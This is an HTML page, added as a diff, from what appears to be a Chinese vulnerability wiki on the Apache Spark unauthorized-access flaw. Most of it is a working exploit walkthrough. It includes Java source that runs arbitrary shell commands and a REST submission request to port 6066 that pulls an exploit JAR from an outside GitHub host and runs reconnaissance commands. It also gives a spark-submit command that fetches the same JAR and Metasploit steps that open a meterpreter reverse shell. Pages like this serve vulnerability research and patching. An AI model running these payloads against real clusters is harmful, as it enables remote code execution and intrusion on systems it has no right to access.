@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache%20Spark/Apache%20Spark%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache Spark 未授权访问漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache Spark \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache%20Struts/Apache%20Struts%20%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8%E5%BF%AB%E9%80%9F%E6%9F%A5%E9%98%85/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache%20Struts/Apache%20Struts%20%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8%E5%BF%AB%E9%80%9F%E6%9F%A5%E9%98%85/" class="btn btn-xs btn-link">
+        Apache Struts 漏洞列表快速查阅
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache%20Solr/%EF%BC%88CVE-2019-17558%EF%BC%89Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache%20Solr/%EF%BC%88CVE-2019-17558%EF%BC%89Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2019-17558）Apache Solr 代码注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-spark">Apache Spark 未授权访问漏洞<a class="headerlink" href="#apache-spark" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Apache
+Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">方法一<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。</p>
+<p>提交方式有两种：</p>
+<ul>
+<li>利用REST API</li>
+<li>利用submissions网关（集成在7077端口中）</li>
+</ul>
+<p>应用可以是Java或Python，就是一个最简单的类，</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span>
+
+<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">Exploit</span> <span class="p">{</span>
+  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="n">throws</span> <span class="ne">Exception</span> <span class="p">{</span>
+    <span class="n">String</span><span class="p">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">String</span> <span class="n">cmd</span> <span class="p">:</span> <span class="n">cmds</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+      <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">executeCommand</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">trim</span><span class="p">()));</span>
+      <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;==============================================&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="o">//</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">mkyong</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">how</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">execute</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="n">command</span><span class="o">-</span><span class="n">from</span><span class="o">-</span><span class="n">java</span><span class="o">/</span>
+  <span class="n">private</span> <span class="n">static</span> <span class="n">String</span> <span class="n">executeCommand</span><span class="p">(</span><span class="n">String</span> <span class="n">command</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">StringBuilder</span> <span class="n">output</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+      <span class="n">p</span><span class="o">.</span><span class="n">waitFor</span><span class="p">();</span>
+      <span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span> <span class="n">InputStreamReader</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">()));</span>
+
+      <span class="n">String</span> <span class="n">line</span><span class="p">;</span>
+      <span class="k">while</span> <span class="p">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">readLine</span><span class="p">())</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="ne">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">output</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>将其编译成JAR，放在任意一个HTTP或FTP上，如</p>
+<p><code>https://download.0-sec.org/Web安全/Apache Spark/Apache Spark 未授权访问漏洞.jar</code>。</p>
+<h4 id="rest-api">用REST API方式提交应用<a class="headerlink" href="#rest-api" title="Permanent link">&para;</a></h4>
+<p>standalone模式下，master将在6066端口启动一个HTTP服务器，我们向这个端口提交REST格式的API：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/v1/submissions/create</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org:6066</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">680</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;CreateSubmissionRequest&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;clientSparkVersion&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.3.1&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;appArgs&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">&quot;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&quot;</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;appResource&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;environmentVariables&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;SPARK_ENV_LOADED&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1&quot;</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;mainClass&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Exploit&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;sparkProperties&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;spark.jars&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;spark.driver.supervise&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;false&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;spark.app.name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Exploit&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;spark.eventLog.enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;true&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;spark.submit.deployMode&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;cluster&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;spark.master&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;spark://your-ip:6066&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>其中，<code>spark.jars</code>即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数。</p>
+<p><img alt="1.png" src="../resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<p>返回的包中有submissionId，然后访问<code>http://www.0-sec.org:8081/logPage/?driverId={submissionId}&amp;logType=stdout</code>，即可查看执行结果：</p>
+<p><img alt="2.png" src="../resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
+<p>注意，提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实战中，由于slave可能有多个。</p>
+<h4 id="submissions">利用submissions网关<a class="headerlink" href="#submissions" title="Permanent link">&para;</a></h4>
+<p>如果6066端口不能访问，或做了权限控制，我们可以利用master的主端口7077，来提交应用。</p>
+<p>方法是利用Apache Spark自带的脚本<code>bin/spark-submit</code>：</p>
+<div class="codehilite"><pre><span></span><code>bin/spark-submit --master spark://www.0-sec.org:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id
+</code></pre></div>
+
+<p>如果你指定的master参数是rest服务器，这个脚本会先尝试使用rest
+api来提交应用；如果发现不是rest服务器，则会降级到使用submission
+gateway来提交应用。</p>
+<p>查看结果的方式与前面一致。</p>
+<h3 id="_5">方法二<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">spark_unauth_rce</span>
+<span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">rhost</span><span class="w"> </span><span class="err">被攻击</span><span class="n">ip</span>
+<span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">rport</span><span class="w"> </span><span class="mi">6066</span>
+<span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">lhost</span><span class="w"> </span><span class="err">攻击</span><span class="n">ip</span>
+<span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">lport</span><span class="w"> </span><span class="mi">4444</span>
+<span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">srvhost</span><span class="w"> </span><span class="mi">1</span><span class="err">攻击</span><span class="n">ip</span>
+<span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">srvport</span><span class="w"> </span><span class="mi">8080</span>
+<span class="n">msf5</span><span class="o">&gt;</span><span class="w"> </span><span class="n">exploit</span>
+</code></pre></div>
+
+<p><img alt="1.png" src="../resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://vulhub.org/">https://vulhub.org/</a>#/environments/spark/unacc/</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache%20Struts/Apache%20Struts%20%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8%E5%BF%AB%E9%80%9F%E6%9F%A5%E9%98%85/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache%20Struts/Apache%20Struts%20%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8%E5%BF%AB%E9%80%9F%E6%9F%A5%E9%98%85/" class="btn btn-xs btn-link">
+        Apache Struts 漏洞列表快速查阅
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache%20Solr/%EF%BC%88CVE-2019-17558%EF%BC%89Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache%20Solr/%EF%BC%88CVE-2019-17558%EF%BC%89Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2019-17558）Apache Solr 代码注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
